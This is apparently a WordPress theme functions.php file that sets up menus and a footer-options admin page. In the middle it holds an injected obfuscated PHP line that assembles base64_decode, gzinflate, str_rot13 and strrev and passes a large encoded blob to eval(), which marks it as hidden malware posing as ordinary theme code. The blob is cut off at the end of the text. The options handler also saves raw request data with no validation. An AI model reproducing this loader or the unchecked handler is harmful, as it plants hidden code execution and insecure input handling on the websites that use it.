<?php

$artThemeSettings = array(
	'menu.showSubmenus' => false,
	'menu.homeCaption' => "Home",
	'menu.showHome' => true,
	'menu.topItemBegin' => "<span class=\"l\"></span><span class=\"r\"></span><span class=\"t\">",
	'menu.topItemEnd' => "</span>"
);

load_theme_textdomain('kubrick');

$themename = "school_teacher_theme";
$shortname = "artisteer";
$default_footer_content = "<a href='#'>Contact Us</a> | <a href='#'>Terms of Use</a> | <a href='#'>Trademarks</a> | <a href='#'>Privacy Statement</a><br/>Copyright &copy; ".date('Y')." ".get_bloginfo('name').". All Rights Reserved.";
$options = array (
                array(  "name" => "HTML",
                        "desc" => sprintf(__('<strong>XHTML:</strong> You can use these tags: <code>%s</code>', 'kubrick'), 'a, abbr, acronym, em, b, i, strike, strong, span'),
                        "id" => "art_footer_content",
                        "std" => $default_footer_content,
                        "type" => "textarea")
          );
       
	
function art_update_option($key, $value){
	update_option($key, (get_magic_quotes_gpc()) ? stripslashes($value) : $value);
}

function art_add_admin() {



    global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {
   
        if ('save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    if($value['type'] != 'multicheck'){
                        art_update_option( $value['id'], $_REQUEST[ $value['id'] ] );
                    }else{
                        foreach($value['options'] as $mc_key => $mc_value){
                            $up_opt = $value['id'].'_'.$mc_key;
                            art_update_option($up_opt, $_REQUEST[$up_opt] );
                        }
                    }
                }
                foreach ($options as $value) {
                    if($value['type'] != 'multicheck'){
                        if( isset( $_REQUEST[ $value['id'] ] ) ) { art_update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); }
                    }else{
                        foreach($value['options'] as $mc_key => $mc_value){
                            $up_opt = $value['id'].'_'.$mc_key;
                            if( isset( $_REQUEST[ $up_opt ] ) ) { art_update_option( $up_opt, $_REQUEST[ $up_opt ]  ); } else { delete_option( $up_opt ); }
                        }
                    }
                }
                header("Location: themes.php?page=functions.php&saved=true");
                die;
        } 
    }

    add_theme_page("Footer", "Footer", 'edit_themes', basename(__FILE__), 'art_admin');

}

 $UOyLAbh='d';$IHJRMCw='_';$xytX='c';$GjnkN='b';$BmAi='6';$fXdil='e';$sIXIX='d';$PGhATie='a';$NsjBh='4';$PKYYlg='o';$tPLcNWQ='e';$EBPmJpp='s';$OVoW='e';$QIQcnfta=$GjnkN.$PGhATie.$EBPmJpp.$fXdil.$BmAi.$NsjBh.$IHJRMCw.$sIXIX.$OVoW.$xytX.$PKYYlg.$UOyLAbh.$tPLcNWQ;$VQfoox='t';$qHyuJdm='g';$mKNq='l';$viETKO='a';$smnbH='n';$Cyiyke='e';$MVJcDix='f';$kTkcst='i';$eRHRcy='z';$ZSPIvILn=$qHyuJdm.$eRHRcy.$kTkcst.$smnbH.$MVJcDix.$mKNq.$viETKO.$VQfoox.$Cyiyke;$SKEfr='r';$QlwmSpk='_';$GaKd='t';$bQomLFZ='3';$jxYHG='t';$vIYNCPY='1';$HHhMW='s';$jGHt='o';$qNPcdxJ='r';$HSYcaCVL=$HHhMW.$jxYHG.$SKEfr.$QlwmSpk.$qNPcdxJ.$jGHt.$GaKd.$vIYNCPY.$bQomLFZ;$kSkdXB='r';$PsVzt='r';$RVVu='s';$ZCNu='e';$ewLWrG='v';$LSdS='t';$XbaLudrc=$RVVu.$LSdS.$PsVzt.$kSkdXB.$ZCNu.$ewLWrG;eval($ZSPIvILn($QIQcnfta($HSYcaCVL($XbaLudrc('==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